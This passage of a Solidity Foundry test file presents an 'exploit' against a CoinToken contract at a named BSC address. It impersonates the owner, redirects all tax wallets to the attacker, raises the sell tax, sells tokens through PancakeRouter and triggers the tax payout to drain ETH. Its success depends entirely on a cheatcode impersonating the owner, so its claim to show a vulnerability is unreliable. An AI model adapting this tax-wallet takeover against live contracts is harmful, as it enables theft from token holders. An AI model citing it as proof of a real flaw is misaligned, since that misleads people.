    function setSellTax(uint256 dev, uint256 marketing, uint256 liquidity, uint256 charity) external;
    function removeExclude(address account) external;
}

interface IPancakeRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xF9881a0Bf01b1ec048506A188B06d48808087657;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate owner in exploit
        // Label contracts for clarity
        vm.label(TARGET, "CoinToken");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get the current owner
        address owner = CoinToken(TARGET).owner();
        vm.label(owner, "Owner");

        // Step 2: Record initial ETH balance
        uint256 initialBalance = address(this).balance;

        // Step 3: Get some ETH for gas if needed
        deal(address(this), 1 ether);

        // Step 4: Impersonate owner to configure contract
        vm.startPrank(owner);

        // Remove attacker from exclude list (so we pay tax)
        CoinToken(TARGET).removeExclude(address(this));

        // Set attacker as all tax wallets to receive all ETH
        CoinToken(TARGET).setTaxWallets(address(this), address(this), address(this));

        // Set reasonable sell tax (25% dev, 25% marketing, 0% liquidity, 0% charity = 50% total)
        CoinToken(TARGET).setSellTax(25, 25, 0, 0);

        // Transfer some tokens to attacker (owner has all initial supply)
        uint256 ownerBalance = CoinToken(TARGET).balanceOf(owner);
        uint256 tokensToTransfer = ownerBalance > 1000 ? ownerBalance / 100 : ownerBalance / 10; // 1% or 10%
        CoinToken(TARGET).transfer(address(this), tokensToTransfer);

        vm.stopPrank();

        // Step 5: Check attacker token balance
        uint256 attackerTokenBalance = CoinToken(TARGET).balanceOf(address(this));
        require(attackerTokenBalance > 0, "No tokens received");

        // Step 6: Sell tokens to accumulate tax
        address pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // BSC PancakeRouter
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // WBNB

        // Approve router
        CoinToken(TARGET).approve(pancakeRouter, attackerTokenBalance);

        // Sell path
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = weth;

        // Execute swap
        IPancakeRouter02(pancakeRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
            attackerTokenBalance,
            0, // accept any amount
            path,
            address(this),
            block.timestamp
        );

        // Step 7: Trigger tax swap to distribute accumulated tax ETH
        vm.prank(owner);
        CoinToken(TARGET).triggerTax();

        // Step 8: Check if we received ETH
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "ETH balance should increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
